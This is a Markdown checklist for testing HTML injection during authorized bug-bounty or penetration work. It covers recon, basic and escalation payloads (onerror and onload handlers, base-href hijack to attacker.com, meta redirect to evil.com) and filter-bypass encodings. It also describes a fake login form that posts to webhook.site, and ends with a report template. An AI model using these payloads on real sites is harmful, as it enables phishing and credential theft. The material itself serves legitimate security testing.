# HTML Injection — Testing Checklist

A step-by-step checklist for testing HTML injection during bug bounty or penetration testing.

> Only test on authorized targets. Always obtain written permission before testing.

---

## Phase 1 — Reconnaissance

- [ ] Map all application input points
- [ ] Identify parameters reflected in responses
- [ ] Check URL parameters (`?q=`, `?name=`, `?search=`, `?msg=`)
- [ ] Check form fields (search, contact, profile, comments)
- [ ] Check HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
- [ ] Check error pages (do they reflect the invalid input/URL?)
- [ ] Check confirmation pages ("Welcome, USERNAME!")
- [ ] Use Burp Suite to intercept and identify all reflected parameters

---

## Phase 2 — Basic Testing

- [ ] Send `<b>htmlitest123</b>` to each identified parameter
- [ ] Check browser — does "htmlitest123" appear **bold**?
- [ ] Check page source — is `<b>` **unencoded** in the HTML?
- [ ] Check `Content-Type` response header (must be `text/html` to be vulnerable)
- [ ] Try additional basic tags: `<h1>`, `<i>`, `<u>`, `<marquee>`
- [ ] Test via URL parameter AND via Burp Suite Repeater

---

## Phase 3 — Confirm & Escalate

- [ ] Confirmed basic tag renders → try `<img src=x onerror=alert(1)>`
- [ ] Try `<svg onload=alert(1)>`
- [ ] Try `<details open ontoggle=alert(1)>`
- [ ] If JavaScript executes → **escalate to XSS report** (higher severity)
- [ ] Try `<base href="https://attacker.com">` — does it hijack relative links?
- [ ] Try `<meta http-equiv="refresh" content="0;url=https://evil.com">`

---

## Phase 4 — Impact Demonstration

- [ ] Inject styled fake login form (use webhook.site as receiver)
- [ ] Verify webhook.site receives data when form is submitted
- [ ] Try fullscreen iframe overlay payload
- [ ] Check if injection is **reflected** (affects only you) or **stored** (affects all users)
- [ ] If stored: logout, login with different account, verify injection persists

---

## Phase 5 — Bypass Testing (if blocked)

- [ ] Try uppercase: `<B>test</B>`, `<IMG SRC=x onerror=alert(1)>`
- [ ] Try no quotes: `<img src=x onerror=alert(1)>`
- [ ] Try alternative tags: `<svg>`, `<details>`, `<video>`
- [ ] Try URL encoding: `%3Cb%3Etest%3C%2Fb%3E`
- [ ] Try HTML entity encoding: `&#60;b&#62;test&#60;/b&#62;`
- [ ] Try nested tags: `<b<b>test</b</b>>`
- [ ] Try HTML comments: `<s<!---->cript>`
- [ ] Try adding whitespace/newlines between attributes

---

## Phase 6 — Documentation

- [ ] Screenshot: payload in Burp request
- [ ] Screenshot: unencoded tag in page source
- [ ] Screenshot: rendered output in browser
- [ ] Screenshot: webhook.site receiving form data (if applicable)
- [ ] Write clear attack scenario
- [ ] Assign CVSS score
- [ ] Write remediation recommendation

---

## Report Writing Template

```
Title: HTML Injection in [parameter] on [endpoint]

Severity: P3 / Medium (or P4 / Low)

Affected URL: https://target.com/endpoint?param=VALUE

Description:
The [parameter] parameter on [endpoint] is vulnerable to HTML 
injection. User-supplied input is reflected in the HTTP response 
without proper HTML encoding, allowing an attacker to inject 
arbitrary HTML markup that is rendered by the victim's browser.

Steps to Reproduce:
1. Navigate to [URL]
2. Set [parameter] to: <b>test</b>
3. Observe that the text "test" appears bold in the response

Impact:
An attacker can exploit this vulnerability to:
- Inject fake login forms to harvest user credentials
- Redirect victims to phishing sites
- Deface page content
- Serve malicious content to other users (if stored)

PoC Payload:
[your payload here]

Evidence:
[screenshots]

Remediation:
HTML encode all user-supplied input before rendering it in HTTP 
responses. Use context-appropriate encoding functions provided 
by your framework. Apply a strict Content Security Policy (CSP).
```

---

## Severity Reference

| Scenario | Suggested Severity |
|---|---|
| Basic `<b>` renders, no attack scenario | Info / P4 |
| Reflected fake login form with webhook PoC | P3 / Medium |
| Reflected page redirect | P3 / Medium |
| `<base>` tag link hijacking | P3 / Medium |
| Stored HTML injection (affects all users) | P2 / High |
| Escalated to XSS | P1-P2 / High-Critical |
